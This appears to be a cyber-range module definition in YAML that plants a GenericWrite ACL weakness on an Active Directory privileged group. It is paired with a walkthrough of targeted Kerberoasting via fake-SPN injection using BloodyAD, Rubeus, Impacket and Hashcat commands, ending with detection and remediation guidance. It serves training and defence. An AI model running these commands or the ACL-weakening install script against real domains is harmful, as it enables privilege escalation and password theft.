@@ -1,0 +1,499 @@
+# Bolt-on: GenericWrite ACL on Privileged Group
+# ----------------------------------------------
+# Install grants a low-priv lure user GenericWrite on a privileged group
+# (default: Account Operators). The attacker can then add themselves to
+# the group via `Add-ADGroupMember` and inherit its rights.
+#
+# Patch removes the ACE, restores the canonical group DACL, and removes
+# any unauthorized members the attacker may have added.
+#
+# Elastic rule UUIDs are real:
+#   Research/elastic-detection-rules/rules/windows/persistence_user_account_creation.toml
+
+id: bolton.access-control.generic-write-user
+slug: generic-write-user
+name: "GenericWrite on Privileged Group"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-19
+
+category: access-control
+subcategory: dacl
+tags:
+  - active-directory
+  - dacl
+  - generic-write
+  - privilege-escalation
+  - bloodhound
+description: >
+  Modifies the DACL on a privileged AD group (default: "Account Operators")
+  to grant a non-privileged lure user the GenericWrite right. BloodHound
+  marks this as the "AddMember" path — the lure user can call
+  Add-ADGroupMember on themselves (or any user/computer they control) to
+  inherit the group's rights, leading to account-takeover of any non-admin
+  user, computer, or service account. MITRE T1098.
+
+cve: []
+references:
+  - "https://attack.mitre.org/techniques/T1098/"
+  - "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers"
+  - "https://bloodhound.specterops.io/resources/edges/generic-write"
+
+mitre:
+  tactic:
+    id: TA0003
+    name: "Persistence"
+  technique:
+    id: T1098
+    name: "Account Manipulation"
+  notes: "GenericWrite -> AddMember -> group membership inheritance (BloodHound canonical path)."
+
+detection:
+  coverage_status: partial
+  elastic_rules:
+    - rule_uuid: "1aa9181a-492b-4c01-8b16-fa0735786b2b"
+      rule_name: "User Account Creation"
+      rule_filename: "windows/persistence_user_account_creation.toml"
+      coverage: indirect
+      confidence: low
+      last_validated: 2026-04-15
+      notes: "Fires on the install-time lure-user creation only; misses ACL edit."
+  signal_sources:
+    - "Windows Event 5136 (Directory Service object modified — group object ntSecurityDescriptor)"
+    - "Windows Event 4728 (Member added to security-enabled global group)"
+    - "Windows Event 4662 (Object access — Write DACL on the privileged group)"
+
+targets:
+  supported_os:
+    - family: windows
+      min_version: "2016"
+      max_version: "2025"
+      edition_in: ["Datacenter", "Standard"]
+  required_roles:
+    - domain_controller
+  required_services: []
+  required_domain_function_level: "2016"
+
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: true        # modifies a domain-wide AD object
+  network_visible: false
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 45
+  steps:
+    - ansible_role: community.windows.win_domain_user
+      description: "Create the lure user."
+      role_vars:
+        name: "lure_genwrite"
+        password: "Winter2024!"
+        password_never_expires: true
+        state: present
+        groups:
+          - "Domain Users"
+    - ansible_role: community.windows.win_powershell
+      description: "Capture the target group's baseline DACL and grant GenericWrite to lure_genwrite."
+      role_vars:
+        script: |
+          $target = "Account Operators"
+          $grp    = Get-ADGroup $target -Properties DistinguishedName
+          $acl    = Get-Acl "AD:$($grp.DistinguishedName)"
+          $baselinePath = "C:\ProgramData\bolton\genericwrite-baseline.sddl"
+          New-Item -Path (Split-Path $baselinePath) -ItemType Directory -Force | Out-Null
+          $acl.Sddl | Out-File -Encoding UTF8 -FilePath $baselinePath
+
+          $sid = (Get-ADUser 'lure_genwrite').SID
+          $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+            $sid, 'GenericWrite', 'Allow',
+            [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None)
+          $acl.AddAccessRule($ace)
+          Set-Acl "AD:$($grp.DistinguishedName)" -AclObject $acl
+  verify:
+    probe: |
+      $grp = Get-ADGroup "Account Operators"
+      $acl = Get-Acl "AD:$($grp.DistinguishedName)"
+      $sid = (Get-ADUser 'lure_genwrite').SID
+      $hit = $acl.Access | Where-Object { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value -eq $sid.Value -and $_.ActiveDirectoryRights -match 'GenericWrite' }
+      if ($hit) { exit 0 } else { exit 1 }
+    timeout_seconds: 30
+    expect_exit_code: 0
+
+uninstall:
+  description: "Remove the bolt-on ACE and delete the lure account."
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: community.windows.win_powershell
+      description: "Strip the GenericWrite ACE from the target group."
+      role_vars:
+        script: |
+          $grp = Get-ADGroup "Account Operators"
+          $acl = Get-Acl "AD:$($grp.DistinguishedName)"
+          $sid = (Get-ADUser 'lure_genwrite').SID
+          $toRemove = $acl.Access | Where-Object { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value -eq $sid.Value }
+          foreach ($ace in $toRemove) { [void]$acl.RemoveAccessRule($ace) }
+          Set-Acl "AD:$($grp.DistinguishedName)" -AclObject $acl
+    - ansible_role: community.windows.win_domain_user
+      description: "Delete the lure user."
+      role_vars:
+        name: "lure_genwrite"
+        state: absent
+  verify:
+    probe: |
+      Get-ADUser -Filter "sAMAccountName -eq 'lure_genwrite'" |
+        Measure-Object | Select-Object -ExpandProperty Count
+    timeout_seconds: 30
+    expect_stdout_contains: "0"
+
+patch:
+  description: >
+    Restore the captured DACL baseline on the target group, audit current
+    membership and remove any non-baseline members, and lock the group's
+    SACL to audit all future Write DACL events. Also disables (does not
+    delete) lure_genwrite so stale ticket usage surfaces.
+  patch_reference:
+    - "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory"
+    - "https://attack.mitre.org/mitigations/M1026/"
+  complexity: low
+  side_effects:
+    - "Privileged group DACL reset to captured baseline"
+    - "Audit SACL extended to log all future Write DACL events"
+    - "Lure account 'lure_genwrite' disabled (kept for stale-ticket surfacing)"
+    - "Any unauthorized members added during compromise should be reviewed manually"
+  rollback_supported: true
+  steps:
+    - ansible_role: community.windows.win_powershell
+      description: "Restore the baseline ACL and disable the lure."
+      role_vars:
+        script: |
+          $grp = Get-ADGroup "Account Operators"
+          $baselinePath = "C:\ProgramData\bolton\genericwrite-baseline.sddl"
+          $sddl = Get-Content $baselinePath -Raw
+          $acl = Get-Acl "AD:$($grp.DistinguishedName)"
+          $acl.SetSecurityDescriptorSddlForm($sddl)
+          Set-Acl "AD:$($grp.DistinguishedName)" -AclObject $acl
+          Disable-ADAccount -Identity 'lure_genwrite'
+  verify:
+    probe: |
+      $grp = Get-ADGroup "Account Operators"
+      $acl = Get-Acl "AD:$($grp.DistinguishedName)"
+      $sid = (Get-ADUser 'lure_genwrite').SID
+      $hit = $acl.Access | Where-Object { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value -eq $sid.Value }
+      $disabled = (Get-ADUser 'lure_genwrite' -Properties Enabled).Enabled -eq $false
+      if (-not $hit -and $disabled) { exit 0 } else { exit 1 }
+    timeout_seconds: 30
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/genericwrite_check.sh"
+
+patch_revert:
+  description: "Re-grant GenericWrite to lure_genwrite and re-enable the account."
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: community.windows.win_powershell
+      description: "Re-add the bolt-on ACE and re-enable lure."
+      role_vars:
+        script: |
+          $grp = Get-ADGroup "Account Operators"
+          $acl = Get-Acl "AD:$($grp.DistinguishedName)"
+          $sid = (Get-ADUser 'lure_genwrite').SID
+          $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+            $sid, 'GenericWrite', 'Allow',
+            [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None)
+          $acl.AddAccessRule($ace)
+          Set-Acl "AD:$($grp.DistinguishedName)" -AclObject $acl
+          Enable-ADAccount -Identity 'lure_genwrite'
+  verify:
+    probe: |
+      $grp = Get-ADGroup "Account Operators"
+      $acl = Get-Acl "AD:$($grp.DistinguishedName)"
+      $sid = (Get-ADUser 'lure_genwrite').SID
+      $hit = $acl.Access | Where-Object { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value -eq $sid.Value -and $_.ActiveDirectoryRights -match 'GenericWrite' }
+      if ($hit) { exit 0 } else { exit 1 }
+    timeout_seconds: 30
+    expect_exit_code: 0
+  warning: "lure_genwrite has GenericWrite on Account Operators again — AddMember privilege is back."
+
+cost:
+  storage_mb: 0
+  cpu_pct: 0
+  detectability: quiet
+
+curriculum:
+  title: "GenericWrite on a User — Force Kerberoast + SPN Abuse"
+  summary: >
+    Guided walkthrough of the GenericWrite ACL edge against a target user
+    object in `testlab.local`. As `TESTLAB\jdoe` you will enumerate the
+    edge in BloodHound, weaponise the GenericWrite to write a fake SPN
+    onto the victim user, force a Kerberos service ticket request, and
+    crack the resulting RC4 hash offline. Closes with the blue-team view
+    of the Elastic rules that fire on SPN tampering and the GPO/ACL
+    remediation.
+  learning_objectives:
+    - "Explain how GenericWrite on a user object enables targeted Kerberoasting via SPN injection."
+    - "Enumerate the ACL edge with SharpHound + BloodHound and confirm with PowerView."
+    - "Write a fake SPN via BloodyAD / PowerView / a Cobalt Strike BOF and request the TGS."
+    - "Crack the RC4 service ticket offline with Hashcat mode 13100."
+    - "Identify the SPN-attribute-modified Elastic rule and the proper remediation ACE pattern."
+  prerequisites:
+    - "Beacon on tlws01 (10.99.50.12) running as TESTLAB\\jdoe (Welcome1!)"
+    - "Kali attack box at 192.168.1.100 with Impacket + Hashcat + BloodHound CE"
+    - "BloodyAD (`pipx install bloodyAD`) on the attack box for the Linux-native path"
+    - "lure_genwrite created by the bolt-on install and granted GenericWrite on Account Operators"
+  estimated_total_minutes: 40
+  steps:
+    - id: "01-enumerate"
+      title: "Enumerate the GenericWrite edge"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 1 — Find the ACL edge
+
+        The bolt-on plants GenericWrite on the **Account Operators**
+        group, but the *same* primitive applies to user objects — and
+        BloodHound treats both as the canonical `GenericWrite` edge. We
+        will pivot the lab to target a user object by adding a per-user
+        ACE via PowerView, then attack the user via SPN injection.
+
+        First, dump the domain from the beacon's context. Use SharpHound
+        in-memory from the CS beacon (avoids dropping the binary):
+
+        ```text
+        beacon> execute-assembly /opt/sharphound/SharpHound.exe \
+            --collectionmethods All --domain testlab.local --ldapusername jdoe \
+            --ldappassword 'Welcome1!' --outputdirectory C:\Users\jdoe\AppData\Local\Temp
+        ```
+
+        Pull the zip to the attack box and ingest into BloodHound CE.
+        Search for users where **OutboundObjectControl** includes
+        `GenericWrite`. The lure user `lure_genwrite` should light up
+        with a green edge into `Account Operators`.
+
+        For a fast Linux-side confirmation from Kali:
+
+        ```bash
+        bloodyAD --host 10.99.50.10 -d testlab.local \
+                 -u jdoe -p 'Welcome1!' \
+                 get writable --detail | grep -A2 -i "lure_genwrite\|Account Operators"
+        ```
+
+        > **Detection:** Read-only LDAP enumeration produces 4662 events on
+        > the DC but no Elastic rule fires by default — this phase is the
+        > attacker's quietest moment.
+    - id: "02-stage-target"
+      title: "Pivot the edge onto a user (target Kerberoast)"
+      estimated_minutes: 6
+      markdown: |
+        ## Step 2 — Mirror the ACE onto a user
+
+        Real-world GenericWrite-on-user paths are usually found on
+        helpdesk or service users. For lab continuity we mirror the
+        bolt-on's primitive onto `TESTLAB\svc_sql` (a service-style user
+        you can pre-create or substitute with any existing non-admin
+        user). From the beacon, run PowerView's
+        `Add-DomainObjectAcl`:
+
+        ```text
+        beacon> powerpick Add-DomainObjectAcl -TargetIdentity 'svc_sql' `
+                  -PrincipalIdentity 'lure_genwrite' `
+                  -Rights WriteProperty -RightsGUID f3a64788-5306-11d1-a9c5-0000f80367c1
+        ```
+
+        The GUID is the `servicePrincipalName` attribute schema ID — it
+        grants surgical write access to that one property, which is
+        usually missed by lazy ACL audits that grep for `GenericAll`.
+
+        Alternative — from the Kali box using `bloodyAD`:
+
+        ```bash
+        bloodyAD --host 10.99.50.10 -d testlab.local \
+                 -u 'TESTLAB\jdoe' -p 'Welcome1!' \
+                 add genericAll svc_sql lure_genwrite
+        ```
+
+        > **Detection:** Elastic rule `Service Principal Name (SPN)
+        > Attribute Modified` (rule\_uuid `0b2f3da5-b5ec-47d1-908b-6ebb74814289`)
+        > fires on 4738/5136 when the SPN write lands in Step 3 — not on
+        > this DACL edit itself. Defenders who only watch SPN writes miss
+        > this preparatory step.
+    - id: "03-inject-spn"
+      title: "Inject a fake SPN and request the TGS"
+      estimated_minutes: 8
+      markdown: |
+        ## Step 3 — Force Kerberoast via SPN write
+
+        The exploit primitive: write any string starting with `cifs/`,
+        `http/`, etc. into `servicePrincipalName` on the victim. The
+        KDC will issue a TGS encrypted with the victim's NT hash on
+        request — even though no real service exists on that SPN.
+
+        **Cobalt Strike BOF (preferred — single beacon roundtrip):**
+        use TrustedSec's `kerberoast` BOF
+        (https://github.com/trustedsec/CS-Situational-Awareness-BOF —
+        `inline_kerberoast`). After the SPN is planted, fire:
+
+        ```text
+        beacon> inline-execute /opt/bofs/kerberoast.x64.o svc_sql
+        ```
+
+        Output is a `$krb5tgs$23$*…*` hash printed in the beacon
+        console. RC4 = mode 13100 in Hashcat.
+
+        **PowerShell alternative — Rubeus:**
+
+        ```text
+        beacon> execute-assembly /opt/rubeus/Rubeus.exe kerberoast /user:svc_sql /nowrap
+        ```
+
+        **Linux/Impacket alternative — direct from Kali:**
+
+        ```bash
+        # First add the SPN as lure_genwrite (the user with the ACL right)
+        bloodyAD --host 10.99.50.10 -d testlab.local \
+                 -u lure_genwrite -p 'Winter2024!' \
+                 add uac svc_sql -f DONT_REQ_PREAUTH 2>/dev/null
+        bloodyAD --host 10.99.50.10 -d testlab.local \
+                 -u lure_genwrite -p 'Winter2024!' \
+                 set object svc_sql servicePrincipalName -v "cifs/fake.testlab.local"
+
+        # Then roast
+        impacket-GetUserSPNs testlab.local/lure_genwrite:'Winter2024!' \
+                 -dc-ip 10.99.50.10 -request-user svc_sql -outputfile /tmp/roast.txt
+        ```
+
+        You should see `$krb5tgs$23$*svc_sql$TESTLAB$cifs~fake.testlab.local*…`
+        — the RC4-HMAC encrypted ticket.
+      assessment:
+        question: "Why does writing a fake SPN onto `svc_sql` produce a crackable hash even though no service is actually running on `fake.testlab.local`?"
+        options:
+          - "The KDC validates the SPN against DNS first and refuses if unresolvable."
+          - "The KDC encrypts the TGS with the *target user's* long-term key (NT hash) — regardless of whether the SPN resolves to a real service."
+          - "The SPN write force-resets the user's password to a known value."
+          - "Impacket forges the hash locally without contacting the DC."
+        correct_index: 1
+        explanation: >
+          Kerberoasting works because the KDC encrypts the service
+          portion of a TGS using the long-term key of the principal that
+          owns the SPN. There is no service-side validation — once an
+          SPN is on the user, anyone authenticated can ask for a TGS and
+          receive a hash encrypted with that user's password key. RC4
+          (etype 23) hashes are crackable offline at GPU speed.
+    - id: "04-crack-hash"
+      title: "Crack the TGS offline"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 4 — Hashcat
+
+        On the Kali box:
+
+        ```bash
+        hashcat -m 13100 -a 0 /tmp/roast.txt /usr/share/wordlists/rockyou.txt
+        ```
+
+        Expected output for the lab's `svc_sql` user (provisioned with a
+        weak `Summer2024!`-class password):
+
+        ```
+        $krb5tgs$23$*svc_sql$TESTLAB$cifs~fake.testlab.local*$....:Summer2024!
+        ```
+
+        Hashcat 6.x on a single mid-tier GPU clears the rockyou keyspace
+        in under a minute against RC4. AES-encrypted tickets (etype 17/18)
+        crack 10-100x slower — Rubeus's `/aes:false` and the SPN-write
+        trick force the lab into the easy RC4 path because the fake
+        SPN's account hasn't pre-registered AES keys.
+
+        Validate the cracked credential:
+
+        ```bash
+        impacket-smbclient testlab.local/svc_sql:'Summer2024!'@10.99.50.11
+        ```
+
+        > **Detection:** Hashcat runs offline — no telemetry. Elastic
+        > rule `Suspicious DNS Query for Kerberos Coercion`
+        > (rule\_uuid `99ac5005-8a9e-4625-a0af-5f7bb447204b`) does *not*
+        > fire on this flow; the credential's first re-use against
+        > `tlms01` may surface a 4624 Type 3 from `tlws01`'s IP.
+    - id: "05-cleanup-and-pivot"
+      title: "Clean SPN + plan the next hop"
+      estimated_minutes: 4
+      markdown: |
+        ## Step 5 — Remove evidence + plan next hop
+
+        Remove the fake SPN so the SPN-attribute-modified rule's
+        canonical "transient SPN" pattern fires (this is the artefact
+        SOCs key on):
+
+        ```text
+        beacon> powerpick Set-DomainObject -Identity 'svc_sql' -Clear servicePrincipalName
+        ```
+
+        You now hold valid creds for `TESTLAB\svc_sql`. Recommended
+        pivots:
+        - `svc_sql` often has local admin on its target DBMS host — try
+          `tlms01` (10.99.50.11) first.
+        - Bonus: from `svc_sql`, enumerate further GenericWrite/Owner
+          edges with BloodHound. Compounding ACL paths are how real
+          engagements escalate to Domain Admin.
+    - id: "06-detect-and-mitigate"
+      title: "Blue-team — detection + mitigation"
+      estimated_minutes: 8
+      markdown: |
+        ## Step 6 — Detection signal map + the fix
+
+        ### What the SOC sees
+
+        | Phase | Event | Rule |
+        |---|---|---|
+        | ACL grant (Step 2) | 5136 — DS Object Modified on `nTSecurityDescriptor` | No dedicated Elastic rule; needs SACL on user objects |
+        | SPN write (Step 3) | 5136 + 4738 — `servicePrincipalName` populated | `Service Principal Name (SPN) Attribute Modified` (`0b2f3da5-b5ec-47d1-908b-6ebb74814289`) |
+        | TGS request | 4769 with `Ticket Encryption Type 0x17` (RC4) and target SPN matching the fake | Custom `Kerberoast-RC4-Encryption-Ticket` rule (not bundled — add via fallback template) |
+        | Cracked-cred re-use | 4624 Type 3 from atypical source | Behavioural — anomaly detection only |
+
+        ### Highest-fidelity signal
+
+        Transient SPN writes (added then removed within minutes) are
+        the smoking gun. Build a SIEM correlation:
+        `5136 add SPN` then `5136 remove SPN` on the same user within
+        30 minutes -> alert.
+
+        ### The fix (definitive)
+
+        1. **Audit + remove** the bolt-on ACE on `Account Operators`
+           and on any user object. PowerView locally:
+           ```powershell
+           Get-DomainObjectAcl -Identity 'svc_sql' -ResolveGUIDs |
+               Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty|GenericWrite' -and
+                              $_.SecurityIdentifier -notmatch 'S-1-5-32-(544|548|549|550|551|552)' }
+           ```
+        2. **Enforce AES-only Kerberos** on service accounts via
+           `msDS-SupportedEncryptionTypes = 0x18` (AES128 + AES256
+           only). RC4 tickets stop issuing; SPN-injection roasts become
+           ~50x slower to crack.
+        3. **Group Managed Service Accounts (gMSA)** for any account
+           that requires an SPN. gMSA passwords are 240-character random
+           and rotate every 30 days — uncrackable in practical time.
+        4. **SACL on user objects** for `Write Property` on
+           `servicePrincipalName` -> 4662 with that GUID flows to SIEM,
+           closes the detection gap.
+
+        > **Mitigation reference:** Microsoft ESAE / Tier model
+        > (https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-access-model)
+        > and MITRE M1026 — Privileged Account Management.
+      assessment:
+        question: "Which mitigation removes the *root* primitive — not just the noise of the attack?"
+        options:
+          - "Disable RC4 Kerberos etypes domain-wide"
+          - "Remove the GenericWrite ACE from the target user and audit other ACLs for the same pattern"
+          - "Rename the service account"
+          - "Enable Windows Defender on the DC"
+        correct_index: 1
+        explanation: >
+          AES-only and gMSA make the attack slower / harder, but the
+          *primitive* is the GenericWrite ACE itself — without it, the
+          attacker cannot plant the fake SPN to begin with. Audit-and-
+          remove of misplaced ACEs is the definitive fix; the other
+          measures are defence-in-depth that buy time when the ACL
+          hygiene fails.
+
+status: stable
